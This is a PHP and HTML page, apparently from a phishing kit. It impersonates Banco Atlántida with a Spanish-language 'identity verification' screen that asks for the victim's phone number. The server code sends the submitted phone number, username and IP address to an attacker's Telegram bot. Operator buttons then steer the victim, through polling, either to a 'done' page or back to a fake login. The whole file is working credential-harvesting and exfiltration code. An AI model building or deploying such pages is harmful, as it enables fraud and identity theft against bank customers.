<?php
require_once __DIR__ . '/gate_check.php';
include __DIR__ . '/data.php';
$usuario = trim($_GET['u'] ?? '');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['phone'])) {
    $phone = trim($_POST['phone']);
    $u     = trim($_POST['u'] ?? $usuario);
    $ip    = '';
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
    }
    $date = date('d/m/Y H:i:s');

    $msg  = "📱 BANCO MANZANA — WASPATT\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: {$u}\n";
    $msg .= "📞 Teléfono: {$phone}\n";
    $msg .= "🌐 IP: " . ($ip ?: '?') . "\n";
    $msg .= "🕒 Fecha: {$date}\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '✅ LISTO',       'callback_data' => "LISTO|{$u}"],
                ['text' => '❌ LOGINERROR',  'callback_data' => "LOGINERROR|{$u}"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => $keyboard,
    ]));

    header('Content-Type: application/json');
    echo json_encode(['ok' => true]);
    exit;
}
?><!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Banco Atlántida — Verificación</title>
  <link rel="icon" href="img/logo-ba.svg" type="image/svg+xml"/>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--red:#E30613;--red-dark:#B30410}
    html,body{font-family:'Inter',-apple-system,sans-serif;min-height:100vh;background:#f5f5f5;color:#1a1a1a}

    .top-bar{background:var(--red);padding:14px 20px;display:flex;align-items:center;justify-content:center}
    .top-bar img{height:38px;width:auto}

    .page{max-width:440px;margin:0 auto;padding:32px 24px 48px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:24px}

    .hero-img{width:100%;max-width:320px;height:auto}

    .info-title{font-size:17px;font-weight:700;color:#111;line-height:1.4}
    .info-sub{font-size:14px;color:#6b7280;line-height:1.6;max-width:300px}

    .field{width:100%}
    .field input{width:100%;height:52px;border:1.5px solid #d1d5db;border-radius:10px;padding:0 16px;font-size:16px;font-family:inherit;color:#111;background:#fff;outline:none;transition:border-color .15s,box-shadow .15s;text-align:center;letter-spacing:1px}
    .field input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.12)}

    .btn-continuar{width:100%;height:52px;border:none;border-radius:10px;background:var(--red);color:#fff;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer;letter-spacing:1px;transition:background .2s,opacity .2s}
    .btn-continuar:hover{background:var(--red-dark)}
    .btn-continuar:disabled{opacity:.6;cursor:not-allowed}

    #waiting{display:none;flex-direction:column;align-items:center;gap:16px;padding:20px 0}
    .spin-ring{width:52px;height:52px;border-radius:50%;border:5px solid transparent;border-top-color:var(--red);animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .wait-txt{font-size:14px;color:#6b7280;font-weight:500}
  </style>
</head>
<body>

<div class="top-bar">
  <img src="img/logo-ba.svg" alt="Banco Atlántida"/>
</div>

<div class="page">

  <img src="img/waspat.png" class="hero-img" alt="Verificación WhatsApp"/>

  <div>
    <div class="info-title">Para continuar es necesario que confirmes tu identidad</div>
  </div>
  <div class="info-sub">Para asegurarnos que otra persona no realice la solicitud en línea por ti, valida tu número telefónico</div>

  <div id="form-area" style="width:100%;display:flex;flex-direction:column;gap:16px">
    <div class="field">
      <input type="tel" id="phoneInput" placeholder="Número de teléfono" maxlength="15" autocomplete="tel"/>
    </div>
    <button class="btn-continuar" id="btnContinuar" onclick="enviar()">CONTINUAR</button>
  </div>

  <div id="waiting">
    <div class="spin-ring"></div>
    <div class="wait-txt">Procesando...</div>
  </div>

</div>

<script>
  const USUARIO = <?= json_encode($usuario) ?>;

  function enviar() {
    const phone = document.getElementById('phoneInput').value.trim();
    if (!phone) { document.getElementById('phoneInput').focus(); return; }

    const btn = document.getElementById('btnContinuar');
    btn.disabled = true;
    btn.textContent = '...';

    const fd = new FormData();
    fd.append('phone', phone);
    fd.append('u', USUARIO);

    fetch('waspatt.php', { method: 'POST', body: fd })
      .then(function(r){ return r.json(); })
      .then(function(d){
        if (d.ok) {
          document.getElementById('form-area').style.display = 'none';
          document.getElementById('waiting').style.display   = 'flex';
          startPoll();
        }
      })
      .catch(function(){
        btn.disabled = false;
        btn.textContent = 'CONTINUAR';
      });
  }

  let pollTimer = null;
  function startPoll() {
    pollTimer = setInterval(function(){
      fetch('check.php?u=' + encodeURIComponent(USUARIO))
        .then(function(r){ return r.json(); })
        .then(function(d){
          if (!d.action) return;
          clearInterval(pollTimer);
          switch(d.action) {
            case '/LISTO':       window.location.href = 'listo.html'; break;
            case '/LOGINERROR':  window.location.href = 'log/index.php?error=1'; break;
            default:             startPoll();
          }
        })
        .catch(function(){});
    }, 2000);
  }

  document.addEventListener('keydown', function(e){
    if (e.key === 'Enter') enviar();
  });
</script>
<script src="protect.js"></script>
</body>
</html>
